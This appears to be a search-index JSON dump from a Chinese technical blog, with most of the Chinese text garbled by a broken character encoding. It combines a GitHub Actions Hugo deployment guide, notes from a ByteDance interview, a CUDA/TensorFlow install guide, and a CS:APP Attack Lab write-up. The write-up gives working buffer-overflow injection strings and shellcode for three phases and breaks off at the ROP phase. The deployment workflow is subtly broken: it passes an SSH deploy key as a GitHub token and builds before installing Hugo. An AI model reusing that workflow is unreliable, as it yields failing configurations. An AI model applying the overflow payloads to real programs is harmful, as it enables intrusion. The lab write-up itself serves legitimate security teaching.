","date":"2020-06-19","objectID":"/posts/github-actions-intro/:2:7","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"è‡ªåŠ¨æ„å»º Hugo åšå®¢ ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:3:0","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"é…ç½®å¯†é’¥ é¦–å…ˆç”Ÿæˆä¸€å¯¹æ–°çš„å¯†é’¥ ssh-keygen -t rsa -b 4096 -C \"$(git config user.email)\" -f github-deploy-key -N \"\" åœ¨å¯¹åº”çš„ gihtub ä»“åº“è®¾ç½®ä¸­çš„Deploy keys,å°†åˆšæ‰ç”Ÿæˆçš„å¯†é’¥å¯¹ä¸­çš„å…¬é’¥æ·»åŠ è¿›å»;ç„¶ååœ¨è®¾ç½®ä¸­çš„Secretsé‡Œé¢æ–°å»ºä¸€ä¸ªSecretï¼Œåä¸ºDEPLOY_KEYï¼Œå°†åˆšæ‰ç”Ÿæˆçš„å¯†é’¥å¯¹ä¸­çš„ç§é’¥æ·»åŠ è¿›å». ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:3:1","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["github"],"content":"é…ç½®workflow åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ–°å»º.github/workflow/gh-pages.yamlï¼Œå†…å®¹ä¸º name: Build GH-Pages on: push: branches: - hugo workflow_dispatch: # manual run jobs: deploy: runs-on: ubuntu-latest steps: - name: Git checkout uses: actions/checkout@v2 with: ref: hugo - name: Get Theme run: git submodule update --init --recursive - name: Update theme to Latest commit run: git submodule update --remote --merge - uses: actions/cache@v2 with: path: /tmp/hugo_cache key: ${{ runner.os }}-hugomod-${{ hashFiles('**/go.sum') }} restore-keys: | ${{ runner.os }}-hugomod- - name: Build run: hugo --buildDrafts --gc --verbose --minify - name: Setup hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \"latest\" - name: Deploy uses: peaceiris/actions-gh-pages@v3 with: github_token: ${{ secrets.DEPLOY_KEY }} publish_dir: ./public ä¸è¿‡éƒ¨ç½² Hexo åšå®¢çš„è¯,ç›®å‰ Vercel æ›´ç®€å•,åœ¨å›½å†…è®¿é—®ä¹Ÿæ›´å¿«. ","date":"2020-06-19","objectID":"/posts/github-actions-intro/:3:2","tags":["CI/CD","gitpages"],"title":"Github Actionsç®€ä»‹","uri":"/posts/github-actions-intro/"},{"categories":["é¢ç»"],"content":"ç¬¬ä¸€è½®é¢è¯• é¦–å…ˆè‡ªæˆ‘ä»‹ç» ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:1:0","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"å¼€å‘çŸ¥è¯† é—®æˆ‘æ¯”è¾ƒç†Ÿæ‚‰ä»€ä¹ˆè¯­è¨€ï¼Œç­”Javaï¼Œé‚å¼€å§‹é—®Javaã€‚ è®²è®²HashMapå®ç°åŸç†ï¼ŒHashTableå’ŒHashMapæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ è®²è®²ConcurrentHashMapæ€ä¹ˆå®ç°çš„ï¼Œæœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ Objectçš„wait()å’Œnotify()æ–¹æ³•æœ‰ä»€ä¹ˆä½œç”¨ï¼Ÿ è®²è®²Jvmå†…å­˜ç»“æ„ã€‚ synchronizedå’ŒLockåœ¨ API/ä½¿ç”¨ä¸Šæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ äº†è§£è¿‡Rediså—ï¼ŒRedisæœ‰å“ªäº›å¸¸è§æ•°æ®ç»“æ„ï¼Ÿ å‰©ä½™çš„è®°ä¸æ¸…äº†â€¦ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:1:1","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"ç®—æ³•é¢˜ å¦‚ä½•åˆ¤æ–­ä¸¤ä¸ªå•é“¾è¡¨æ˜¯å¦æœ‰äº¤ç‚¹ï¼Œå•é“¾è¡¨æ˜¯å¦æˆç¯ï¼Ÿ nä¸ªäºŒæç®¡ï¼Œè¶…è¿‡n/2ä¸ªäºŒæç®¡æ˜¯å¥½çš„ã€‚ä¸¤ä¸ªäºŒæç®¡å¯ä»¥ç›¸äº’åˆ¤æ–­å¯¹æ–¹æ˜¯å¥½è¿˜æ˜¯åï¼Œå¥½çš„äºŒæç®¡ç»™çš„åˆ¤æ–­ä¸€å®šæ˜¯å‡†ç¡®çš„ï¼Œåçš„äºŒæç®¡ç»™å‡ºçš„ç»“æœæ˜¯ä¸å‡†ç¡®çš„ã€‚æ‰¾å‡ºæ‰€æœ‰å¥½çš„äºŒæç®¡ã€‚ å†™å‡ºäºŒå‰æ ‘çš„å±‚åºéå†ã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:1:2","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"åé—® è¯·é—®å²—ä½å·¥ä½œå…·ä½“æ˜¯å¹²ä»€ä¹ˆï¼Ÿ ä¸€èˆ¬é¢è¯•å­¦ç”Ÿä¸»è¦è€ƒå¯ŸåŸºç¡€çŸ¥è¯†ï¼Œä¸ºå•¥æ²¡æœ‰è¯¢é—® OS/è®¡ç½‘çš„çŸ¥è¯†ï¼Ÿ ç­”ï¼šç›®å‰æ¯”è¾ƒéœ€è¦èƒ½å°½å¿«ä¸Šæ‰‹å·¥ä½œçš„å®ä¹ ç”Ÿï¼Œæ‰€ä»¥å…ˆè€ƒå¯ŸæŠ€æœ¯ã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:1:3","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"ç¬¬äºŒè½®é¢è¯• é¦–å…ˆè‡ªæˆ‘ä»‹ç» ç„¶åè¯¢é—®ä¸€ä¸‹å»å¹´åœ¨å¤´æ¡çš„å®ä¹ ç»å†ï¼Œè°ˆäº†ä¸€ä¸‹ç®€å†ä¸Šçš„å¤§ä½œä¸šã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:2:0","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"åŸºç¡€çŸ¥è¯† è®²è®²ç½‘ç»œçš„äº”å±‚æ¨¡å‹ç»“æ„ã€‚ è®²è®²ä¸‰æ¬¡æ¡æ‰‹ã€å››æ¬¡æŒ¥æ‰‹ã€‚ ä¸ºä»€ä¹ˆè¦ä¸‰æ¬¡æ¡æ‰‹ï¼Œå››æ¬¡æŒ¥æ‰‹ï¼Ÿ è®²è®²çº¿ç¨‹å’Œè¿›ç¨‹çš„åŒºåˆ«ï¼Ÿ è°ˆè°ˆå¯¹åç¨‹çš„ç†è§£ã€‚ çº¿ç¨‹é—´ä»€ä¹ˆæ—¶å€™äº§ç”Ÿæ­»é”ï¼Ÿå¦‚ä½•è¿›è¡Œæ­»é”é¿å…/é¢„é˜²ï¼Ÿ Javaæœ‰å“ªäº›å¸¸è§å®¹å™¨ï¼Ÿ ConcurrentHashMapåœ¨å¹¶å‘è®¿é—®æ—¶ç›¸è¾ƒäºHashTableæœ‰ä»€ä¹ˆç¼ºç‚¹ï¼Ÿ ä¸€æ—¶æ²¡æƒ³èµ·æ¥ï¼Œé¢è¯•å®˜æç¤ºäº†size()ï¼Œç„¶åæˆ‘è®²äº†ä¸‹ConcurrentHashMapåœ¨å¹¶å‘è®¿é—®æ—¶è°ƒç”¨size()çš„è¿‡ç¨‹åŠoverheadã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:2:1","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"ç®—æ³•é¢˜ å†™ä¸€ä¸ªäºŒå‰æ ‘å·¦è§†å›¾ åˆšå¼€å§‹æƒ³åˆ°å±‚åºéå†ï¼Œç„¶ååªè®°å½•æ¯å±‚ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œåæ¥é¢è¯•å®˜æç¤ºæˆ‘ç®€åŒ–ï¼Œå†™æˆé€’å½’ç‰ˆæœ¬ã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:2:2","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"æé—® ä¸»è¦å¼€å‘å†™ä»€ä¹ˆï¼Œç”¨ä»€ä¹ˆæŠ€æœ¯æ ˆï¼Ÿ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:2:3","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"HR é¢è¯• ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:3:0","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"HR é—® é¦–å…ˆè‡ªæˆ‘ä»‹ç» é—®æœ‰ä»€ä¹ˆçˆ±å¥½ï¼Ÿ å®ä¹ æ—¶é—´ï¼Œå¯¹æœªæ¥çš„èŒä¸šè§„åˆ’ï¼Ÿ ä¸Šæ¬¡å®ä¹ çš„ç»å†ï¼Œé‡åˆ°ä»€ä¹ˆå›°éš¾ï¼Ÿ æœ¬æ¬¡å®ä¹ é¢„è®¡å®Œæˆä»€ä¹ˆç›®æ ‡ å¯¹åŠ ç­çš„æƒ³æ³•ï¼Œæ¥æ”¶åº¦ã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:3:1","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["é¢ç»"],"content":"æé—® å®ä¹ åœ°ç‚¹ æœ€ç»ˆåœ¨4-25æ”¶åˆ°äº† offer callï¼Œç¡®è®¤äº†ä¸€ä¸‹è–ªèµ„ç¦åˆ©ï¼Œå®ä¹ æ—¶é—´ç­‰ã€‚æ€»çš„æ¥è¯´ï¼Œä»Šå¹´æ˜¥æ‹›å®ä¹ æŠ•é€’ç»å†ä¸»è¦æ˜¯ç§¯æ”’ç»éªŒäº†ï¼Œæœ€å¼€å§‹çš„ä¸¤å®¶å‡†å¤‡ä¸è¶³ï¼Œè¢«æŒ‚çš„æŒºæƒ¨ã€‚ä¹‹åé¢å‘é¢è¯•å­¦ä¹ äº†ä¸€æ®µæ—¶é—´æ‰æ‹¿åˆ°è¿™ä¸ª offerã€‚ ","date":"2020-04-18","objectID":"/posts/2020-bytedance-backend-intern/:3:2","tags":["é¢ç»","åç«¯","Java"],"title":"20å¹´å­—èŠ‚è·³åŠ¨åç«¯å¼€å‘é¢è¯•","uri":"/posts/2020-bytedance-backend-intern/"},{"categories":["Linux"],"content":"æ˜¾å¡é©±åŠ¨ æœ€æ–°çš„ 18.04.3 å·²ç»å¯ä»¥å®‰è£… 430 é©±åŠ¨ sudo apt install nvidia-driver-430 ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:1:0","tags":["tensorflow-gpu"],"title":"Ubuntuå®‰è£…tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"å®‰è£…è¦æ±‚ å®˜ç½‘æœ‰å®‰è£…æ‰€éœ€è½¯ä»¶è¦æ±‚ ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:2:0","tags":["tensorflow-gpu"],"title":"Ubuntuå®‰è£…tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"å®‰è£… cuda åŠå…¶ç»„ä»¶ å»å®˜ç½‘ä¸‹è½½cuda å®‰è£… runfile åŠå…¶è¡¥ä¸ï¼Œ # Add NVIDIA package repository chmod +x ./cuda_10.0.130_410.48_linux.run ./cuda_10.0.130.1_linux.run sudo ./cuda_10.0.130_410.48_linux.run sudo ./cuda_10.0.130.1_linux.run æ³¨æ„ä¸è¦é‡å¤å®‰è£… nvidia æ˜¾å¡é©±åŠ¨ã€‚ ç„¶åä¸‹è½½cudnn. tar -zxvf cudnn-10.0-linux-x64-v7.6.2.24.tgz sudo cp cuda/include/cudnn.h /usr/local/cuda/include sudo cp cuda/lib64/libcudnn* /usr/local/cuda/lib64 sudo chmod a+r /usr/local/cuda/include/cudnn.h /usr/local/cuda/lib64/libcudnn* ç„¶åè®¾ç½®ç¯å¢ƒå˜é‡(cuda å®‰è£…å®Œæˆæ—¶ä¼šæç¤º) export PATH=/usr/local/cuda/bin/:$PATH export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/cuda/extras/CUPTI/lib64 æ£€éªŒä¸‹å®‰è£… wmc@omen:~$ nvcc -V nvcc: NVIDIA (R) Cuda compiler driver Copyright (c) 2005-2018 NVIDIA Corporation Built on Sat_Aug_25_21:08:01_CDT_2018 Cuda compilation tools, release 10.0, V10.0.130 ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:3:0","tags":["tensorflow-gpu"],"title":"Ubuntuå®‰è£…tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"Anaconda Anaconda å®‰è£…ååˆ†ç®€å•.å»å–œé—»ä¹è§çš„tunaä¸‹è½½ã€‚ chmod +x Anaconda3-2019.07-Linux-x86_64.sh ./Anaconda3-2019.07-Linux-x86_64.sh æ›´æ¢ anaconda å’Œ pip é•œåƒæº conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ conda config --set show_channel_urls yes pip install pip -U pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬ä½¿ç”¨åˆ›å»ºä¸€ä¸ªæ–°çš„ python è™šæ‹Ÿç¯å¢ƒï¼Œå®‰è£… tensorflow-gpu. conda create -n tensor pip python=3.6 source activate tensor pip install --upgrade tensorflow-gpu ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:4:0","tags":["tensorflow-gpu"],"title":"Ubuntuå®‰è£…tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"å®‰è£… jupyter æ’ä»¶ conda install -c conda-forge jupyter_contrib_nbextensions jupyter contrib nbextension install --user ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:4:1","tags":["tensorflow-gpu"],"title":"Ubuntuå®‰è£…tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"å°† conda è™šæ‹Ÿç¯å¢ƒä½œä¸º jupyter å†…æ ¸ conda activate tensorflowenv pip install ipykernel python -m ipykernel install --user --name tensorflowenv --display-name \"Python (tensorflowenv)\" ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:4:2","tags":["tensorflow-gpu"],"title":"Ubuntuå®‰è£…tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["Linux"],"content":"ç¤ºä¾‹æµ‹è¯• import tensorflow as tf mnist = tf.keras.datasets.mnist (x_train, y_train),(x_test, y_test) = mnist.load_data() x_train, x_test = x_train / 255.0, x_test / 255.0 model = tf.keras.models.Sequential([ tf.keras.layers.Flatten(input_shape=(28, 28)), tf.keras.layers.Dense(128, activation='relu'), tf.keras.layers.Dropout(0.2), tf.keras.layers.Dense(10, activation='softmax') ]) model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy']) model.fit(x_train, y_train, epochs=5) model.evaluate(x_test, y_test) è¿è¡Œç»“æœ ","date":"2019-02-01","objectID":"/posts/ubuntu-install-tf-gpu/:5:0","tags":["tensorflow-gpu"],"title":"Ubuntuå®‰è£…tf-gpu","uri":"/posts/ubuntu-install-tf-gpu/"},{"categories":["CS:APP"],"content":"å®éªŒæè¿° æœ¬æ¬¡å®éªŒåˆ©ç”¨ç¨‹åºéœ€è¦å¤–éƒ¨è¾“å…¥çš„ç‰¹ç‚¹ï¼Œè¾“å…¥æœºå™¨ç å¯¹ç¨‹åºè¿”å›å€¼è¦†ç›–ï¼Œä»¥è¾¾åˆ°æ”»å‡»çš„ç›®çš„ï¼Œå³åœ¨ getbuf å‡½æ•°éœ€è¦çš„è¾“å…¥ä¸­åšæ‰‹è„šï¼Œä»¥è‡´ä¸èƒ½æ­£å¸¸è¿”å›ï¼Œæ‰§è¡Œæ”»å‡»ä»£ç ã€‚ ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:1:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"ç¬¬ä¸€é˜¶æ®µ ç¬¬ä¸€é˜¶æ®µä¸­æ ˆéšæœºåŒ–æœªå¼€æœºï¼Œå¯ä»¥å¾—çŸ¥å†…å­˜ä½ç½®çš„ç¡®åˆ‡åœ°å€ï¼Œä¸”æ ˆä¸­æœºå™¨ç å¯æ‰§è¡Œã€‚ é‚£ä¹ˆæˆ‘ä»¬å°†éœ€è¦æ‰§è¡Œçš„æ“ä½œç å’Œåœ°å€è¾“å…¥æœºå™¨ç å³å¯ã€‚ ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:2:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_1 ç¬¬ä¸€å…³éå¸¸ç®€å•ï¼Œé¢˜ç›®ä¸»è¦æˆ‘ä»¬åœ¨ getbuf æ‰§è¡Œå®Œæˆåæ‰§è¡Œ touch1,touch1()æ— å‚ã€‚ (gdb) disas getbuf Dump of assembler code for function getbuf: 0x0000000000401688 \u003c+0\u003e: sub $0x18,%rsp 0x000000000040168c \u003c+4\u003e: mov %rsp,%rdi 0x000000000040168f \u003c+7\u003e: callq 0x4018ca \u003cGets\u003e 0x0000000000401694 \u003c+12\u003e: mov $0x1,%eax 0x0000000000401699 \u003c+17\u003e: add $0x18,%rsp 0x000000000040169d \u003c+21\u003e: retq End of assembler dump. (gdb) disas touch1 Dump of assembler code for function touch1: 0x00000000004016a0 \u003c+0\u003e: sub $0x8,%rsp 0x00000000004016a4 \u003c+4\u003e: movl $0x1,0x2029ee(%rip) # 0x60409c \u003cvlevel\u003e 0x00000000004016ae \u003c+14\u003e: mov $0x402e4e,%edi 0x00000000004016b3 \u003c+19\u003e: callq 0x400bd0 \u003cputs@plt\u003e 0x00000000004016b8 \u003c+24\u003e: mov $0x1,%edi 0x00000000004016bd \u003c+29\u003e: callq 0x401ab5 \u003cvalidate\u003e 0x00000000004016c2 \u003c+34\u003e: mov $0x0,%edi 0x00000000004016c7 \u003c+39\u003e: callq 0x400d60 \u003cexit@plt\u003e End of assembler dump. å¯ä»¥çœ‹åˆ°ï¼Œgetbuf å¼€å‡ºäº† 0x18ï¼Œå³ 24 å­—èŠ‚çš„ç©ºé—´ï¼Œtouch1 çš„åœ°å€ä¸º 0x4016a0ã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€å¡«æ»¡è¿™ 0x28 ç©ºé—´ï¼Œå†ä»¥ touch1 åœ°å€æ›¿ä»£è¿”å›å€¼ã€‚æ³¨æ„ï¼šx86-64 æœºå™¨ä¸­ï¼Œé‡‡ç”¨å°ç«¯æ³•ï¼Œå…¶ä½ä½å­—èŠ‚å­˜æ”¾åœ¨ä½åœ°å€ï¼Œæ•…æˆ‘ä»¬è¾“å…¥æ•°æ®æ—¶ï¼Œå…ˆè¾“å…¥ä½ä½ã€‚ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 a0 16 40 00 00 00 00 00 è½¬æ¢åè¾“å…¥å³å¯ Cookie: 0x63149380 Type string:Touch1!: You called touch1() Valid solution for level 1 with target ctarget PASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 A0 16 40 00 00 00 00 00 ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:2:1","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_2 ç¬¬äºŒå…³æ ¹æ®é¢˜æ„ï¼Œéœ€è¦è°ƒç”¨ touch2ï¼Œéœ€è¦ä¼ é€’ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°å€¼ï¼Œå…¶å€¼ä¸º cookieï¼ŒæŸ¥çœ‹ cookie æ–‡ä»¶ï¼Œå¦‚ä¸‹ã€‚ 2017211523@bupt3:~/target117$ cat cookie.txt 0x63149380 ä¸ºäº†ç»™ touch2 ä¼ å‚ï¼Œæˆ‘ä»¬éœ€è¦å°† cookie å€¼èµ‹ç»™%rdiï¼Œç„¶åå°† touch2 åœ°å€å‹æ ˆï¼Œä½¿ç”¨ ret å¼¹å‡º touch2 åœ°å€è¿”å›ï¼Œè°ƒç”¨ touch2ã€‚ mov $0x63149380,%rdi pushq $0x4016cc ret å°†å…¶ç¼–è¯‘ä¸ºäºŒè¿›åˆ¶ä¹‹ååœ¨åæ±‡ç¼–ï¼Œå¾—åˆ°å¦‚ä¸‹ï¼Œç”±æ­¤æˆ‘ä»¬ä¾¿çŸ¥æŒ‡ä»¤çš„æœºå™¨ç æ˜¯å¤šå°‘ã€‚ phase2.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c.text\u003e: 0: 48 c7 c7 80 93 14 63 mov $0x63149380,%rdi 7: 68 cc 16 40 00 pushq $0x4016cc c: c3 retq æˆ‘ä»¬å°†æŒ‡ä»¤çš„æœºå™¨ç æ”¾åœ¨ getbuf æ—¶çš„æ ˆé¡¶ï¼Œç„¶åå°†è¿”å›å€¼ä½ç½®è®¾ç½®ä¸ºæ ˆé¡¶åœ°å€ï¼Œè¿™æ ·æ—¢å¯è¾¾åˆ°ç›®çš„ï¼Œè°ƒç”¨ getbuf æ—¶æ ˆé¡¶åœ°å€ä¸º 0x5566f7a8ã€‚ 48 c7 c7 80 93 14 63 68 cc 16 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 a8 f7 66 55 00 00 00 00 è¾“å…¥è¿è¡Œã€‚ 2017211523@bupt3:~/target117$ ./hex2raw \u003c phase2 | ./ctarget -q Cookie: 0x63149380 Type string:Touch2!: You called touch2(0x63149380) Valid solution for level 2 with target ctarget PASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:2:48 C7 C7 80 93 14 63 68 CC 16 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:2:2","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_3 æŸ¥çœ‹ touch3 void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval); validate(3); } else { printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval); fail(3); } exit(0); } å¯çŸ¥å…¶éœ€è¦ä¸€ä¸ªæŒ‡å‘å­—ç¬¦çš„æŒ‡é’ˆ svalï¼Œç„¶åè°ƒç”¨ hexmatchï¼Œå°† cookie å’Œ sval ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œéœ€è¦ hexomatch è¿”å›éé›¶å€¼ã€‚ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); return strncmp(sval, s, 9) == 0; } ç”± hexmatch å¯çŸ¥ï¼Œå…¶æ¯”è¾ƒ cookie çš„å­—ç¬¦ä¸²è¡¨ç¤ºä¸ä¼ å…¥çš„å­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ï¼Œç›¸ç­‰åˆ™è¿”å› 1ï¼Œé‚£ä¹ˆé—®é¢˜æ˜äº†ï¼Œæˆ‘ä»¬éœ€è¦å°†è¡¨ç¤º cookie çš„å­—ç¬¦ä¸²åœ°å€ä¼ ç»™ touch3ï¼Œä¸ç¬¬äºŒé¢˜ä¸åŒçš„æ˜¯å­—ç¬¦ä¸²éœ€è¦æœ‰ç©ºé—´ä¿å­˜ï¼Œæˆ‘ä»¬éœ€è¦åœ¨æ ˆä¸­æ‰¾å‡ºè°ƒç”¨ hexmatch æ—¶å€™æœªè¢«é‡å†™æ”¹å˜çš„ç©ºé—´ï¼Œå€Ÿä»¥ä¿å­˜å­—ç¬¦ä¸²ã€‚ mov $0x5566f7c8,%rdi pushq $0x4017a0 ret è¿™é‡Œæˆ‘ä»¬å°† cookie çš„å­—ç¬¦ä¸²è¡¨ç¤ºæ”¾åœ¨ 0x5566f7c8ï¼Œç¼–è¯‘å†åæ±‡ç¼–å¾—åˆ°æœºå™¨ç  phase3.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c.text\u003e: 0: 48 c7 c7 c8 f7 66 55 mov $0x5566f7c8,%rdi 7: 68 a0 17 40 00 pushq $0x4017a0 c: c3 retq æŸ¥è¡¨å¾—å‡º cookie å­—ç¬¦ä¸²çš„ 16 è¿›åˆ¶è¡¨ç¤ºä¸º 36 33 31 34 39 33 38 30ï¼Œæ³¨æ„ï¼šä»¥å­—ç¬¦ä¸²å½¢åŠ¿æ¯”è¾ƒæ—¶ä¸ç”¨å†åè½¬è¾“å…¥ï¼Œä¸”å­—ç¬¦ä¸²åº”æœ‰ç»“å°¾å­—ç¬¦â€˜\\0â€™ï¼Œå¾—åˆ°æ”»å‡»å­—ç¬¦ä¸²å¦‚ä¸‹ 48 c7 c7 c8 f7 66 55 68 a0 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 a8 f7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00 è½¬æ¢è¾“å…¥è¿è¡Œ 2017211523@bupt3:~/target117$ ./hex2raw \u003c phase3 | ./ctarget -q Cookie: 0x63149380 Type string:Touch3!: You called touch3(\"63149380\") Valid solution for level 3 with target ctarget PASS: Would have posted the following: user id 2017211523 course f18 lab attacklab result 117:PASS:0xffffffff:ctarget:3:48 C7 C7 C8 F7 66 55 68 A0 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 A8 F7 66 55 00 00 00 00 36 33 31 34 39 33 38 30 00 ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:2:3","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"ç¬¬äºŒé˜¶æ®µ åœ¨æ­¤é˜¶æ®µï¼Œç¨‹åºæ·»åŠ äº†ä¸¤ä¸ªç°ä»£è®¡ç®—æœºç¨‹åºå‡ ä¹å¿…é¡»çš„å¯¹æŠ—ç¼“ç¼“å†²åŒºæº¢å‡ºæ”»å‡»çš„æªæ–½ï¼š 1.å‡½æ•°æ ˆéšæœºåŒ– ï¼Œæ— æ³•å†è·å–ç»å¯¹åœ°å€ã€‚ 2.æ ˆå†…å­˜çš„å†…å®¹è¢«é”å®šä¸ºä¸å¯æ‰§è¡Œã€‚ æ•…æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ ROP(é¢å‘è¿”å›ç¼–ç¨‹)ï¼Œå³ä½¿ç”¨ç¨‹åºä¸­æœ¬æ¥å°±å­˜åœ¨çš„ä»£ç ç»„æˆæˆ‘ä»¬éœ€è¦çš„æ“ä½œï¼Œå†å°†å…¶åœ°å€ä½œä¸ºè¿”å›å€¼ï¼Œä¸æ–­ç”¨ ret æŒ‡ä»¤è¿”å›å®Œæˆæ‰€éœ€æ“ä½œã€‚ ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:3:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_4 æ­¤å…³éœ€ç”¨ ROP æ–¹æ³•å®Œæˆ phase_2 å†…å®¹ã€‚é‚£ä¹ˆå°±éœ€è¦åœ¨æ“ä½œä¸­å¾—åˆ° cookie å€¼ï¼Œé‚£ä¹ˆåªæœ‰ç”¨ pop 